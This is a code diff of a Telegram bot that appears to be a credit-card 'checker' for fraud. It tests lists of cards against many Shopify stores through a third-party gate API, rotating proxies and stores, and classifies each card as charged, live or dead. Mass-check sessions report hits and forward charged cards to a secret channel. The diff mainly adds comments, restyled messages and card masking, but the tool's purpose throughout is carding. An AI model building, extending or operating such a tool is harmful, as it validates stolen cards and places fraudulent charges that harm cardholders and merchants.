         except asyncio.CancelledError:
@@ -750,7 +1008,7 @@ async def _check_card_with_retry(
         nonlocal pool
         skip      = tried | local_dead
         available = [s for s in pool if s not in skip]
-        if not available:
+        if not available:          # exhausted pool once — reset and try again
             local_dead.clear()
             tried.clear()
             pool      = list(sites)
@@ -762,10 +1020,14 @@ async def _check_card_with_retry(
         tried.add(s)
         return s
 
+    # ── main loop — one round = SITE_BATCH parallel attempts ─────────
     while attempt < max_sites:
+
+        # Stop signal (mass check)
         if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
             raise asyncio.CancelledError()
 
+        # Pick up to SITE_BATCH distinct untried sites for this round
         batch: list[str] = []
         for _ in range(min(SITE_BATCH, max_sites - attempt)):
             s = _pick_site()
@@ -776,6 +1038,7 @@ async def _check_card_with_retry(
 
         attempt += len(batch)
 
+        # Race all sites in the batch simultaneously
         tasks = [
             asyncio.ensure_future(
                 _try_one(s, random.choice(px_pool) if px_pool else None)
@@ -799,12 +1062,16 @@ async def _check_card_with_retry(
                 logging.info(f"[API] {card[:6]}** #{attempt}/{max_sites} "
                              f"site={site} → {resp!r}")
 
+                # Timeout → mark dead, tally for early-exit
                 if resp == "timeout" or resp == "Timeout":
                     batch_timeouts += 1
                     local_dead.add(site)
                     last_resp = resp
                     continue
 
+                # HTTP-level error from the API server itself (not the Shopify site).
+                # 502/503/504 mean the gate API (lucifer.up.railway.app) is down —
+                # retrying with a different Shopify site won't help.
                 if http_st and http_st not in (200,):
                     local_dead.add(site)
                     last_resp = f"HTTP {http_st}"
@@ -812,6 +1079,8 @@ async def _check_card_with_retry(
                         consec_api_errs += 1
                     else:
                         consec_api_errs = 0
+                    # After 5 consecutive gate-API failures, the API server itself
+                    # is down — abort immediately instead of wasting 80 attempts.
                     if consec_api_errs >= 5:
                         logging.error(
                             f"[SH] {card[:6]}** gate API returned HTTP {http_st} "
@@ -820,8 +1089,9 @@ async def _check_card_with_retry(
                         return "DEAD", f"Gate API unavailable (HTTP {http_st})", price, currency
                     continue
 
-                consec_api_errs = 0
+                consec_api_errs = 0   # reset on any 200
 
+                # Rate-limited → put site back and let next round retry it
                 if http_st == 429 or (resp and "status: 429" in resp.lower()):
                     tried.discard(site)
                     continue
@@ -834,9 +1104,9 @@ async def _check_card_with_retry(
 
                 if classification in ("CHARGED", "TDS", "LIVE", "DEAD"):
                     winner = (classification, resp, price, currency)
-                    break
+                    break   # cancel remaining in this batch
 
-                # RETRY / ERROR / RECHECK — site gave a non-bank response or needs recheck
+                # RETRY / ERROR — site gave a non-bank response
                 local_dead.add(site)
 
         except asyncio.CancelledError:
@@ -844,16 +1114,18 @@ async def _check_card_with_retry(
             await asyncio.gather(*tasks, return_exceptions=True)
             raise
         finally:
+            # Always cancel any still-running tasks from this batch
             for t in tasks: t.cancel()
             await asyncio.gather(*tasks, return_exceptions=True)
 
         if winner:
             return winner
 
+        # ── Early-exit on dead proxies ────────────────────────────────
         if batch_timeouts == len(batch):
             consec_timeouts += batch_timeouts
         else:
-            consec_timeouts = 0
+            consec_timeouts = 0   # a real response resets the counter
 
         if consec_timeouts >= CONSEC_TIMEOUT_MAX:
             logging.warning(
@@ -863,41 +1135,61 @@ async def _check_card_with_retry(
             )
             return "DEAD", "timeout", price, currency
 
+        # ── Pace: small delay between rounds to avoid flooding the API ─
         await asyncio.sleep(ROUND_DELAY)
 
-    # ── All attempts exhausted ────────────────────────────────────────────────
-    # Only return LIVE if the last response was INSUFFICIENT_FUNDS or GENERIC_ERROR.
-    # Other responses (PCI Error, etc.) are not considered Live after exhausting retries.
+    # ── All attempts exhausted ────────────────────────────────────────
+    # If the last real bank response was an ambiguous/unknown one (not a
+    # site error), surface it as LIVE rather than silently marking DEAD.
     logging.warning(f"[SH] {card[:6]}** exhausted {max_sites} sites  last={last_resp!r}")
-    if last_resp:
-        mu = last_resp.upper().strip()
-        if "INSUFFICIENT_FUNDS" in mu or "GENERIC_ERROR" in mu:
-            return "LIVE", last_resp, price, currency
+    if last_resp and _is_success_response(last_resp):
+        return "LIVE", last_resp, price, currency
     return "DEAD", last_resp, price, currency
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # MISC HELPERS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def _te(eid: str, fb: str = "●") -> str:
+    """Wrap a custom emoji ID in a <tg-emoji> HTML tag.
+    Animates for Telegram Premium users; shows fallback glyph for others.
+    Requires parse_mode='HTML' on the containing message."""
     return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'
 
+
 def _u16len(s: str) -> int:
+    """UTF-16 code-unit length — what Telegram uses for entity offsets."""
     return len(s.encode("utf-16-le")) // 2
 
+
 def html_to_entities(html: str):
+    """
+    Convert sh.py-style HTML into (plain_text, entities).
+
+    This is the ONLY reliable way to send custom emoji stickers in PTB.
+    Sending <tg-emoji> via parse_mode="HTML" often falls back to the
+    plain-text fallback character; injecting MessageEntity objects directly
+    guarantees animated premium stickers display for ALL users.
+
+    Handles: <b>  <code>  <a href="...">  <tg-emoji emoji-id="...">
+    Decodes: &lt;  &gt;  &amp;  &quot;
+    Entities may overlap (e.g. bold + custom_emoji on the same glyph).
+    """
     text     = ""
     entities = []
-    stack    = []
+    stack    = []        # [{name, offset, url?}]
     i        = 0
     n        = len(html)
 
     while i < n:
         ch = html[i]
 
+        # ── HTML tag ────────────────────────────────────────────────────────
         if ch == "<":
             j   = html.index(">", i)
             tag = html[i + 1 : j]
 
+            # Closing tag
             if tag.startswith("/"):
                 tag_name = tag[1:].strip().lower()
                 for k in range(len(stack) - 1, -1, -1):
@@ -920,6 +1212,7 @@ def html_to_entities(html: str):
                         break
                 i = j + 1
 
+            # <tg-emoji emoji-id="...">FALLBACK</tg-emoji>  — handled inline
             elif tag.lower().startswith("tg-emoji"):
                 m = re.search(r'emoji-id="([^"]+)"', tag)
                 if m:
@@ -937,6 +1230,7 @@ def html_to_entities(html: str):
                 else:
                     i = j + 1
 
+            # Opening tag
             else:
                 tag_name = tag.split()[0].lower() if tag else ""
                 entry    = {"name": tag_name, "offset": _u16len(text)}
@@ -947,6 +1241,7 @@ def html_to_entities(html: str):
                 stack.append(entry)
                 i = j + 1
 
+        # ── HTML entity escapes ─────────────────────────────────────────────
         elif ch == "&":
             if   html[i:i+4] == "&lt;":  text += "<"; i += 4
             elif html[i:i+4] == "&gt;":  text += ">"; i += 4
@@ -954,16 +1249,29 @@ def html_to_entities(html: str):
             elif html[i:i+6] == "&quot;":text += '"'; i += 6
             else:                        text += ch;  i += 1
 
+        # ── Plain text ──────────────────────────────────────────────────────
         else:
             text += ch
             i    += 1
 
     return text, entities if entities else None
 
+
 def _send_ents(html: str):
+    """Return (plain_text, entities_or_None) from an HTML string."""
     return html_to_entities(html)
 
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# DIRECT MESSAGE ENTITY BUILDER
+# Builds Telegram messages with entities directly — ZERO HTML involved.
+# This is the only guaranteed way to show animated custom emoji stickers
+# for ALL users in python-telegram-bot.  No HTML → entities conversion
+# required; MessageEntity objects are injected straight into the API call.
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
 class MsgBuilder:
+    """Fluent builder that accumulates plain text + MessageEntity objects."""
     __slots__ = ("_txt", "_ents")
 
     def __init__(self):
@@ -972,8 +1280,10 @@ class MsgBuilder:
 
     @staticmethod
     def _u16(s: str) -> int:
+        """UTF-16 code-unit length — what Telegram uses for entity offsets."""
         return len(s.encode("utf-16-le")) // 2
 
+    # ── primitive appenders ──────────────────────────────────────────────
     def raw(self, s: str) -> "MsgBuilder":
         if s: self._txt += s
         return self
@@ -997,6 +1307,7 @@ class MsgBuilder:
         return self
 
     def emoji(self, eid: str, fb: str) -> "MsgBuilder":
+        """Animated custom emoji sticker inline (no bold wrapper)."""
         if not fb: return self
         o = self._u16(self._txt); l = self._u16(fb); self._txt += fb
         if l: self._ents.append(
@@ -1004,6 +1315,7 @@ class MsgBuilder:
         return self
 
     def bold_emoji(self, eid: str, fb: str) -> "MsgBuilder":
+        """Bold text + animated custom emoji sticker overlapped on the same glyph."""
         if not fb: return self
         o = self._u16(self._txt); l = self._u16(fb); self._txt += fb
         if l:
@@ -1013,6 +1325,7 @@ class MsgBuilder:
         return self
 
     def bold_link(self, display: str, url: str) -> "MsgBuilder":
+        """Bold + hyperlink on the same text."""
         if not display: return self
         o = self._u16(self._txt); l = self._u16(display); self._txt += display
         if l:
@@ -1027,6 +1340,7 @@ class MsgBuilder:
         return self
 
     def mention(self, username: str) -> "MsgBuilder":
+        """@username mention entity."""
         if not username: return self
         o = self._u16(self._txt); l = self._u16(username); self._txt += username
         if l: self._ents.append(MessageEntity(type="mention", offset=o, length=l))
@@ -1036,22 +1350,59 @@ class MsgBuilder:
         self._txt += "\n" * n
         return self
 
+    # ── finalise ─────────────────────────────────────────────────────────
     def build(self):
+        """Return (plain_text, entities_or_None) ready for send_message/edit_text."""
         return self._txt, self._ents if self._ents else None
 
+
 def _uname(user) -> str:
+    """Plain display name (no HTML)."""
     return getattr(user, "first_name", None) or "User"
 
+
 def _uurl(user) -> str:
+    """Telegram profile URL."""
     if getattr(user, "username", None):
         return f"https://t.me/{user.username}"
     return f"tg://user?id={user.id}"
 
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# STICKER RESOLVER  —  the ONLY approach that works for ALL
+# users regardless of whether the bot has Telegram Premium.
+#
+# custom_emoji entities in text messages only display as
+# animated stickers when the BOT ACCOUNT has Premium.
+# Without Premium the fallback glyph (plain "💎") shows instead.
+#
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# STICKER / MEDIA HELPERS
+#
+# Telegram's Bot API rejects custom emoji sticker file_ids from
+# every send method (send_sticker, send_animation, send_document …)
+# with "Can't parse entities" or "Wrong file type" / "Bad Request".
+# The ONLY supported way to display premium animated emoji in bot
+# messages is <tg-emoji emoji-id="...">fallback</tg-emoji> inside
+# an HTML message.  That tag animates for Premium users and shows
+# the fallback glyph for everyone else — no Premium required to read.
+#
+# All sticker-send code below is therefore reduced to stubs / pure
+# send_message wrappers so the codebase compiles unchanged but never
+# triggers the Telegram 400 error.
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
 async def _get_sticker_fid(bot, emoji_id: str):
+    """Stub — custom emoji sticker file_ids cannot be sent by bots.
+    Kept for API compatibility (imported by mst.py). Always returns None."""
     return None
 
+
 async def _send_sticker(bot, chat_id, emoji_id: str):
+    """No-op — custom emoji stickers cannot be sent via any Bot API method.
+    Animated emoji display is handled by <tg-emoji> tags in HTML messages."""
     pass
+
 
 async def _send_as_media(bot, chat_id, emoji_id: str, caption: str,
                           parse_mode: str = "HTML", reply_markup=None,
@@ -1078,43 +1429,18 @@ async def _send_as_media(bot, chat_id, emoji_id: str, caption: str,
         # entities= so premium custom_emoji stickers always render animated.
         plain_text, ents = html_to_entities(full_html)
 
-        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        # RETRY LOGIC — Fix for skipped CHARGED cards during mass check.
-        # When many hits happen at once, Telegram rate-limits the bot (429).
-        # Without retrying, the message is dropped and the user never gets it.
-        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        max_retries = 5
-        for attempt in range(max_retries):
-            try:
-                await bot.send_message(
-                    chat_id=chat_id,
-                    text=plain_text,
-                    entities=ents if ents else None,
-                    reply_markup=reply_markup,
-                    disable_web_page_preview=True,
-                    disable_notification=disable_notification,
-                    reply_to_message_id=reply_to_message_id,
-                )
-                return  # Success! Exit the function.
-            except RetryAfter as exc:
-                wait_time = float(getattr(exc, 'retry_after', 2.0))
-                logging.warning(f"[MEDIA] Rate limited by Telegram. Sleeping for {wait_time}s before retry...")
-                await asyncio.sleep(wait_time)
-            except (NetworkError, TimedOut) as exc:
-                logging.warning(f"[MEDIA] Network error on attempt {attempt + 1}/{max_retries}: {exc}")
-                await asyncio.sleep(2)
-            except BadRequest as exc:
-                if "chat not found" in str(exc).lower() or "blocked by the user" in str(exc).lower():
-                    logging.warning(f"[MEDIA] Cannot send to {chat_id}: {exc}")
-                    return  # User blocked the bot, no point retrying
-                if attempt < max_retries - 1:
-                    logging.warning(f"[MEDIA] BadRequest on attempt {attempt + 1}: {exc}")
-                    await asyncio.sleep(1)
-                else:
-                    raise
-        logging.error(f"[MEDIA] Failed to send message to {chat_id} after {max_retries} retries.")
+        await bot.send_message(
+            chat_id=chat_id,
+            text=plain_text,
+            entities=ents if ents else None,
+            reply_markup=reply_markup,
+            disable_web_page_preview=True,
+            disable_notification=disable_notification,
+            reply_to_message_id=reply_to_message_id,
+        )
     except Exception as exc:
         logging.warning(f"[MEDIA] send_message to {chat_id} failed: {exc}")
+
 
 def _plan_eid(plan: str) -> str:
     norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in (plan or ""))
@@ -1125,15 +1451,31 @@ def _plan_eid(plan: str) -> str:
             return v
     return PRO_EMOJI_ID
 
+
 def _user_link(user) -> str:
     name = escape(getattr(user, "first_name", None) or "User")
     if getattr(user, "username", None):
         return f'<a href="https://t.me/{user.username}">{name}</a>'
     return f'<a href="tg://user?id={user.id}">{name}</a>'
 
+
 def _fmt_time(s: float) -> str:
     s = int(s)
     return f"{s//60}m {s%60}s" if s >= 60 else f"{s}s"
+
+
+def _mask_card(card: str) -> str:
+    """Return a UI-safe preview without exposing PAN or CVV."""
+    raw = str(card or "").strip()
+    parts = re.split(r"\s*[|/:=]\s*", raw)
+    if len(parts) == 4:
+        number, month, year, _cvv = parts
+        tail = number[-4:] if len(number) >= 4 else number
+        return f"•••• {tail} | {month.zfill(2)} / {str(year)[-2:]} | •••"
+    if len(raw) > 8 and raw.isdigit():
+        return f"•••• {raw[-4:]}"
+    return "•••• ••••"
+
 
 def _fmt_price(price: str, currency: str) -> str:
     try:
@@ -1144,11 +1486,17 @@ def _fmt_price(price: str, currency: str) -> str:
         pass
     return "0.00 USD"
 
+
 def _is_premium(ud: dict, uid: int) -> bool:
     return (uid == OWNER_ID or ud.get("premium", False)
             or ud.get("plan") not in (None, "TRIAL"))
 
+
 def _get_ud(uid: int, ctx) -> dict:
+    """Fetch (or create) user dict from the SAME store as main.py.
+    main.py uses bot_data["user_data"][str(uid)] with 150 starter credits.
+    Using a different key ("users") meant sh.py always saw an empty dict → 0 credits.
+    """
     ud_store = ctx.bot_data.setdefault("user_data", {})
     key      = str(uid)
     if key not in ud_store:
@@ -1162,18 +1510,19 @@ def _get_ud(uid: int, ctx) -> dict:
             "total_refs": 0, "total_checks": 0, "approved_checks": 0,
             "declined_checks": 0, "last_gate": "N/A", "last_card": "N/A",
             "codes_redeemed": 0, "keys_redeemed": 0, "banned": False,
-            "total_charged": 0,
+            "total_charged": 0,   # lifetime CHARGED cards
         }
     return ud_store[key]
 
+
 def _sid() -> str:
     return "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # BIN LOOKUP
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 COUNTRY_FLAGS = {
-    
     "US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷",
     "IN":"🇮🇳","BR":"🇧🇷","MX":"🇲🇽","JP":"🇯🇵","CN":"🇨🇳","RU":"🇷🇺",
     "IT":"🇮🇹","ES":"🇪🇸","NL":"🇳🇱","SE":"🇸🇪","NG":"🇳🇬","ZA":"🇿🇦",
@@ -1393,50 +1742,49 @@ def build_result_msg(card, resp, verdict, bin_data, price, currency,
     # Show raw API response directly — same as msh.py
     display_resp_clean = raw_resp
 
-    display_resp_raw = raw_resp.upper() if raw_resp else "UNKNOWN"
-
     ch_link  = f'<a href="{CHANNEL_LINK}">[❆]</a>'
     live_eid = get_random_live_emoji()
 
     if verdict == "CHARGED":
-        status_line  = (f'<b>{ch_link} HIT CHARGED '
+        status_line  = (f'<b>{ch_link} CHARGED HIT '
                         f'<tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji></b>')
-        gate_line    = f"Gate ➛ Shopify • {_fmt_price(price, currency)}"
+        gate_line    = f"Shopify • {_fmt_price(price, currency)}"
         resp_te      = f'<tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji>'
         safe_resp    = escape(display_resp_clean)
     elif verdict == "TDS":
-        status_line  = (f'<b>{ch_link} HIT LIVE [3DS] '
+        status_line  = (f'<b>{ch_link} LIVE · 3DS '
                         f'<tg-emoji emoji-id="{live_eid}">✅</tg-emoji></b>')
-        gate_line    = "Gate ➛ Shopify"
+        gate_line    = "Shopify"
         resp_te      = f'<tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji>'
         safe_resp    = escape(display_resp_clean)          # real API response
     elif verdict == "LIVE":
-        status_line  = (f'<b>{ch_link} HIT LIVE '
+        status_line  = (f'<b>{ch_link} LIVE HIT '
                         f'<tg-emoji emoji-id="{live_eid}">✅</tg-emoji></b>')
-        gate_line    = "Gate ➛ Shopify"
+        gate_line    = "Shopify"
         resp_te      = f'<tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji>'
         safe_resp    = escape(display_resp_clean)          # real API response
     else:  # DEAD
-        status_line  = (f'<b>{ch_link} DEAD DECLINED '
+        status_line  = (f'<b>{ch_link} DECLINED '
                         f'<tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>')
-        gate_line    = "Gate ➛ Shopify"                  # no price on DEAD
+        gate_line    = "Shopify"                         # no price on DEAD
         resp_te      = f'<tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji>'
         safe_resp    = escape(display_resp_clean)
 
+    safe_card = escape(_mask_card(card))
     return (
         f'{status_line}\n'
-        f'\n'
-        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n'
-        f'<b>   ⤷ <code>{escape(card)}</code></b>\n'
-        f'<b>{gate_line}</b>\n'
-        f'<b>──────────</b>\n'
-        f'<b>{resp_te} Resp ➛ {safe_resp}</b>\n'
-        f'<b>Bin ➛ <code>{bin_s}</code></b>\n'
-        f'<b>──────────</b>\n'
-        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➛ {ts}</b>\n'
-        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➛ {ulink} '
+        f'<b>╭────────────────────</b>\n'
+        f'<b>│ <tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji> Card  <code>{safe_card}</code></b>\n'
+        f'<b>│ Gate   {gate_line}</b>\n'
+        f'<b>├────────────────────</b>\n'
+        f'<b>│ {resp_te} Result <code>{safe_resp}</code></b>\n'
+        f'<b>│ BIN    <code>{bin_s}</code></b>\n'
+        f'<b>├────────────────────</b>\n'
+        f'<b>│ <tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> Time   {ts}</b>\n'
+        f'<b>│ <tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> User   {ulink} '
         f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>\n'
-        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➛ {DEV_LINK_HTML} '
+        f'<b>╰────────────────────</b>\n'
+        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> {DEV_LINK_HTML} '
         f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
     )
 
@@ -1453,17 +1801,20 @@ def _progress_text(sess: dict) -> str:
     ts    = _fmt_time(time.time() - sess["start_time"])
     uobj  = sess.get("user_obj")
     ulink = _user_link(uobj) if uobj else "User"
+    status = sess.get("status", "CHECKING")
+    status_label = "RUNNING" if status == "CHECKING" else status
     return (
-        f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➛ Shopify</b>\n'
-        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➛ {sess["checked"]}/{sess["total"]}</b>\n'
-        f"<b>──────────</b>\n"
-        f'<b><tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji> Charged ➛ {sess["charged"]}</b>\n'
-        f'<b><tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji> Live    ➛ {sess["approved"]}</b>\n'
-        f'<b><tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji> Dead    ➛ {sess["dead"]}</b>\n'
-        f'<b><tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji> Errors  ➛ {sess["errors"]}</b>\n'
-        f"<b>──────────</b>\n"
-        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> Time ➛ {ts}</b>\n'
-        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> {ulink} <tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji>  |  <tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> {DEV_LINK_HTML}</b>'
+        f'<b>╭━━━ <tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> SHOPIFY MASS AUDIT ━━━╮</b>\n'
+        f'<b>┃ <tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> {status_label}  ·  {sess["checked"]}/{sess["total"]}</b>\n'
+        f'<b>┣━━━━━━━━━━━━━━━━━━━━━━┫</b>\n'
+        f'<b>┃ <tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji> Charged   {sess["charged"]}</b>\n'
+        f'<b>┃ <tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji> Live      {sess["approved"]}</b>\n'
+        f'<b>┃ <tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji> Declined  {sess["dead"]}</b>\n'
+        f'<b>┃ <tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji> Errors    {sess["errors"]}</b>\n'
+        f'<b>┣━━━━━━━━━━━━━━━━━━━━━━┫</b>\n'
+        f'<b>┃ <tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> {ts}   ·   {ulink} '
+        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>\n'
+        f'<b>╰━━ <tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> {DEV_LINK_HTML} ━━╯</b>'
     )
 
 
@@ -1473,15 +1824,15 @@ def _msh_buttons(sid: str, running: bool) -> RawMarkup:
     all_n  = sess.get("checked",  0)
     charged_n = sess.get("charged", 0)
     rows = [[
-        _btn(f"Charged ({charged_n})", cb=f"{_CB_RESULT}:{sid}:charged",
+        _btn(f"Charged · {charged_n}", cb=f"{_CB_RESULT}:{sid}:charged",
              style="danger",   icon=BTN_CHARGED_EMOJI_ID),
-        _btn(f"Live ({live_n})",       cb=f"{_CB_RESULT}:{sid}:live",
+        _btn(f"Live · {live_n}",       cb=f"{_CB_RESULT}:{sid}:live",
              style="success",  icon=BTN_LIVE_EMOJI_ID),
-        _btn(f"All ({all_n})",         cb=f"{_CB_RESULT}:{sid}:all",
+        _btn(f"All · {all_n}",         cb=f"{_CB_RESULT}:{sid}:all",
              style="primary",  icon=BTN_ALL_EMOJI_ID),
     ]]
     if running:
-        rows.append([_btn("⛔ Stop", cb=f"{_CB_STOP}:{sid}",
+        rows.append([_btn("Stop checking", cb=f"{_CB_STOP}:{sid}",
                           style="danger", icon=BTN_STOP_EMOJI_ID)])
     return RawMarkup(rows)
 
@@ -1546,7 +1897,7 @@ def _make_result_file(sess: dict, kind: str) -> tuple:
                   "Dead"    if ver == "DEAD" else "Error")
         raw_disp = f"{resp} | {prc} {cur}" if ver == "CHARGED" else resp
         lines += [
-            f"Card ➳ {cd.get('card','N/A')}",
+            f"Card ➳ {_mask_card(cd.get('card','N/A'))}",
             f"Status ➳ {status}",
             f"Gate ➳ Shopify | {prc} {cur}",
             f"Resp ➳ {raw_disp}",
@@ -1599,7 +1950,7 @@ async def _send_hit(bot, user, text: str, verdict: str,
     # 👁 ORDER_PAID
     # User ➛ @username
     # Custom emoji IDs: 6253354142526345892 = 💎 · 6220029508456548253 = 👁
-    gate_txt = f"Gate ➛ Shopify • {_fmt_price(price, currency)}"
+    gate_txt = f"Shopify • {_fmt_price(price, currency)}"
 
     uname_display = (
         f"@{user.username}" if getattr(user, "username", None)
@@ -1608,12 +1959,13 @@ async def _send_hit(bot, user, text: str, verdict: str,
 
     plan_eid = _plan_eid(plan)
     log_html = (
-        f'<b>HIT ➛ CHARGED '
+        f'<b>╭━━ CHARGED HIT '
         f'<tg-emoji emoji-id="{eid}">💎</tg-emoji></b>\n'
-        f'<b>{gate_txt}</b>\n'
-        f'<b><tg-emoji emoji-id="{HIT_RESP_EMOJI_ID}">✅</tg-emoji>'
+        f'<b>┃ {gate_txt}</b>\n'
+        f'<b>┣━━━━━━━━━━━━━━</b>\n'
+        f'<b>┃ <tg-emoji emoji-id="{HIT_RESP_EMOJI_ID}">✅</tg-emoji>'
         f' <code>{resp_disp}</code></b>\n'
-        f'<b>User ➛ {ulink}'
+        f'<b>┃ User  {ulink}'
         f' <tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji></b>'
     )
 
@@ -1665,14 +2017,14 @@ async def _send_hit(bot, user, text: str, verdict: str,
             sc_lbl = ("CHARGED 💎" if verdict == "CHARGED"
                       else "LIVE [3DS] ✅" if verdict == "TDS" else "LIVE ✅")
             sc_html = (
-                f"<b>HIT ➛ {sc_lbl}</b>\n"
-                f"<b>{gate_txt}</b>\n"
-                f"<b>──────────</b>\n"
-                f"<b>💳 <code>{escape(card)}</code></b>\n"
-                f"<b>🏦 {bin_s}</b>\n"
-                f"<b>──────────</b>\n"
-                f"<b>👤 {ulink} ⭐</b>\n"
-                f"<b>⚡ {DEV_LINK_HTML}</b>"
+                f"<b>╭━━ {sc_lbl} ━━╮</b>\n"
+                f"<b>┃ {gate_txt}</b>\n"
+                f"<b>┣━━━━━━━━━━━━━━</b>\n"
+                f"<b>┃ 💳 <code>{escape(_mask_card(card))}</code></b>\n"
+                f"<b>┃ 🏦 {bin_s}</b>\n"
+                f"<b>┣━━━━━━━━━━━━━━</b>\n"
+                f"<b>┃ 👤 {ulink} ⭐</b>\n"
+                f"<b>╰━━ ⚡ {DEV_LINK_HTML} ━━╯</b>"
             )
             await asyncio.sleep(0.2)
             await _send_as_media(bot, SECRET_CHANNEL_ID, eid,
@@ -1848,9 +2200,13 @@ async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.answer(f"❌ No {kind.capitalize()} cards yet.", show_alert=True); return
     await q.answer("📦 Generating file…")
     labels  = {"charged": "Charged 💎", "live": "Live ✅", "all": "All 📁"}
-    caption = (f"<b>Result ➳ {labels.get(kind,'All')}</b>\n"
-               f"<b>Total ➳ {count}</b>\n"
-               f"<b>Gate ➳ Shopify Mass</b>")
+    caption = (
+        f"<b>╭━━ REPORT READY ━━╮</b>\n"
+        f"<b>┃ {labels.get(kind, 'All').upper()} RESULTS</b>\n"
+        f"<b>┃ Total   {count}</b>\n"
+        f"<b>┃ Source  Shopify Mass</b>\n"
+        f"<b>╰━━━━━━━━━━━━━━╯</b>"
+    )
     try:
         await context.bot.send_document(
             chat_id=q.message.chat_id,
@@ -1955,10 +2311,12 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # ── Spinner (initial "Checking..." message) ───────────────────────────────
     spin = await update.message.reply_text(
-        f'<b><tg-emoji emoji-id="{SH_GATE_EMOJI_ID}">❤️</tg-emoji>gate ➳Shopify</b>\n'
-        f'<b><tg-emoji emoji-id="{SH_PROG_EMOJI_ID}">😄</tg-emoji>Progress ➳ 0/1</b>\n'
-        f'<b>Live ➳ 0 <tg-emoji emoji-id="{SH_LIVE_EMOJI_ID}">🎸</tg-emoji>✅</b>',
-        parse_mode="HTML"
+        f'<b>╭━━━ <tg-emoji emoji-id="{SH_GATE_EMOJI_ID}">🛒</tg-emoji> SHOPIFY CHECK ━━━╮</b>\n'
+        f'<b>┃ <tg-emoji emoji-id="{SH_PROG_EMOJI_ID}">🔄</tg-emoji> CHECKING  ·  0/1</b>\n'
+        f'<b>┣━━━━━━━━━━━━━━━━━━┫</b>\n'
+        f'<b>┃ <tg-emoji emoji-id="{SH_LIVE_EMOJI_ID}">✅</tg-emoji> Preparing secure result…</b>\n'
+        f'<b>╰━━━━━━━━━━━━━━━━━━╯</b>',
+        parse_mode="HTML",
     )
 
     proxies = _load_proxies()
